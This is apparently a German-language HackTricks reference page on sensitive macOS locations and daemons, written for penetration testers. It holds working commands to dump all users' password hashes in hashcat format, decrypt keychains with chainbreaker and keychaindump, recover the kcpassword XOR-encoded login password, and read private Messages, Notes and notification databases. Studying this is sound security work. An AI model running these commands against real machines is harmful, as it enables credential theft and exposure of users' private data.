# macOS Sensible Standorte & Interessante Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwörter

### Schattenpasswörter

Das Schattenpasswort wird mit der Benutzerkonfiguration in plists gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\
Der folgende Einzeiler kann verwendet werden, um **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) auszugeben:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte wie dieses hier**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in **hashcat** **Format** zu transformieren.

Eine alternative Einzeiler, die die Anmeldeinformationen aller Nicht-Dienstkonten im hashcat-Format `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Eine weitere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, besteht darin, `dscl` zu verwenden: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Diese Datei wird **nur verwendet**, wenn das System im **Einbenutzermodus** läuft (also nicht sehr häufig).

### Keychain Dump

Beachten Sie, dass beim Verwenden der Sicherheits-Binärdatei, um die **entschlüsselten Passwörter zu dumpen**, mehrere Aufforderungen den Benutzer bitten, diese Operation zuzulassen.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basierend auf diesem Kommentar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) scheint es, dass diese Tools in Big Sur nicht mehr funktionieren.

### Keychaindump Übersicht

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Schlüsselbunden zu extrahieren, hat jedoch Einschränkungen bei neueren macOS-Versionen wie Big Sur, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angegeben. Die Verwendung von **keychaindump** erfordert, dass der Angreifer Zugriff erhält und die Berechtigungen auf **root** eskaliert. Das Tool nutzt die Tatsache aus, dass der Schlüsselbund standardmäßig beim Benutzer-Login zur Bequemlichkeit entsperrt ist, sodass Anwendungen darauf zugreifen können, ohne das Passwort des Benutzers wiederholt eingeben zu müssen. Wenn ein Benutzer jedoch beschließt, seinen Schlüsselbund nach jeder Verwendung zu sperren, wird **keychaindump** unwirksam.

**Keychaindump** funktioniert, indem es einen bestimmten Prozess namens **securityd** anvisiert, der von Apple als Daemon für Autorisierungs- und kryptografische Operationen beschrieben wird und entscheidend für den Zugriff auf den Schlüsselbund ist. Der Extraktionsprozess umfasst die Identifizierung eines **Master Key**, der aus dem Login-Passwort des Benutzers abgeleitet ist. Dieser Schlüssel ist entscheidend für das Lesen der Schlüsselbunddatei. Um den **Master Key** zu finden, scannt **keychaindump** den Speicherheap von **securityd** mit dem Befehl `vmmap` und sucht nach potenziellen Schlüsseln in Bereichen, die als `MALLOC_TINY` gekennzeichnet sind. Der folgende Befehl wird verwendet, um diese Speicherorte zu inspizieren:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nachdem potenzielle Master-Schlüssel identifiziert wurden, durchsucht **keychaindump** die Heaps nach einem spezifischen Muster (`0x0000000000000018`), das einen Kandidaten für den Master-Schlüssel anzeigt. Weitere Schritte, einschließlich Deobfuskation, sind erforderlich, um diesen Schlüssel zu nutzen, wie im Quellcode von **keychaindump** dargelegt. Analysten, die sich auf diesem Gebiet konzentrieren, sollten beachten, dass die entscheidenden Daten zum Entschlüsseln des Schlüsselspeichers im Speicher des **securityd**-Prozesses gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** ist:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX-Schlüsselbund auf forensisch einwandfreie Weise zu extrahieren:

- Gehashtes Schlüsselbund-Passwort, geeignet zum Knacken mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet-Passwörter
- Generische Passwörter
- Private Schlüssel
- Öffentliche Schlüssel
- X509-Zertifikate
- Sichere Notizen
- Appleshare-Passwörter

Mit dem Schlüsselbund-Entsperrpasswort, einem Master-Schlüssel, der mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) erhalten wurde, oder einer Entsperrdatei wie SystemKey, wird Chainbreaker auch Klartext-Passwörter bereitstellen.

Ohne eine dieser Methoden zum Entsperren des Schlüsselbunds zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) mit SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) Hash knacken**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpen von Schlüsselbundschlüsseln (mit Passwörtern) mit einem Speicherdump**

[Folgen Sie diesen Schritten](../#dumping-memory-with-osxpmem), um einen **Speicherdump** durchzuführen.
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpen von Schlüsselbundschlüsseln (mit Passwörtern) unter Verwendung des Benutzerpassworts**

Wenn Sie das Benutzerpasswort kennen, können Sie es verwenden, um **Schlüsselbunde, die dem Benutzer gehören, zu dumpen und zu entschlüsseln**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Die **kcpassword**-Datei ist eine Datei, die das **Login-Passwort des Benutzers** enthält, jedoch nur, wenn der Systembesitzer die **automatische Anmeldung** aktiviert hat. Daher wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).

Das Passwort wird in der Datei **`/etc/kcpassword`** xored mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** gespeichert. Wenn das Passwort des Benutzers länger als der Schlüssel ist, wird der Schlüssel wiederverwendet.\
Dies macht das Passwort ziemlich einfach wiederherzustellen, zum Beispiel mit Skripten wie [**diesem**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Nachrichten
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Benachrichtigungen

Sie finden die Benachrichtigungsdaten in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Die meisten interessanten Informationen befinden sich in **blob**. Sie müssen also diesen Inhalt **extrahieren** und in **menschlich** **lesbare** Form **transformieren** oder **`strings`** verwenden. Um darauf zuzugreifen, können Sie Folgendes tun:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
### Hinweise

Die **Notizen** der Benutzer befinden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Präferenzen

In macOS-Apps befinden sich die Präferenzen in **`$HOME/Library/Preferences`** und in iOS sind sie in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kann das CLI-Tool **`defaults`** verwendet werden, um **die Präferenzdatei zu ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Dienste `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Präferenzen durchzuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen, die auf Knotenattribute angewendet werden, und ist durch SIP geschützt.\
Diese Datei gewährt bestimmten Benutzern Berechtigungen anhand der UUID (und nicht uid), sodass sie auf spezifische sensible Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` unter anderem zugreifen können:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Systembenachrichtigungen

### Darwin-Benachrichtigungen

Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den Mach-Port `com.apple.system.notification_center` registrieren (überprüfen Sie sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon ist mit der Datei `/etc/notify.conf` konfigurierbar.

Die für Benachrichtigungen verwendeten Namen sind eindeutige umgekehrte DNS-Notationen, und wenn eine Benachrichtigung an einen von ihnen gesendet wird, erhalten die Client(s), die angegeben haben, dass sie damit umgehen können, diese.

Es ist möglich, den aktuellen Status zu dumpen (und alle Namen zu sehen), indem das Signal SIGUSR2 an den notifyd-Prozess gesendet und die generierte Datei gelesen wird: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

Das **Distributed Notification Center**, dessen Hauptbinary **`/usr/sbin/distnoted`** ist, ist ein weiterer Weg, um Benachrichtigungen zu senden. Es stellt einige XPC-Dienste zur Verfügung und führt einige Überprüfungen durch, um zu versuchen, Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können Anwendungen sich für **Themen** registrieren. Der Client generiert ein Token, indem er die Server von Apple über **`apsd`** kontaktiert.\
Dann haben die Anbieter ebenfalls ein Token generiert und können sich mit den Servern von Apple verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die wartende Anwendung weiterleitet.

Die Einstellungen befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

Es gibt eine lokale Datenbank von Nachrichten, die sich in macOS in `/Library/Application\ Support/ApplePushService/aps.db` und in iOS in `/var/mobile/Library/ApplePushService` befindet. Sie hat 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Es ist auch möglich, Informationen über den Daemon und die Verbindungen mit folgendem Befehl zu erhalten:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Benutzerbenachrichtigungen

Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:

- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **Das schwarze Brett**: Dies zeigt in iOS ein Banner an, das verschwindet und im Benachrichtigungszentrum gespeichert wird.
- **`NSUserNotificationCenter`**: Dies ist das iOS schwarze Brett in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

{{#include ../../../banners/hacktricks-training.md}}
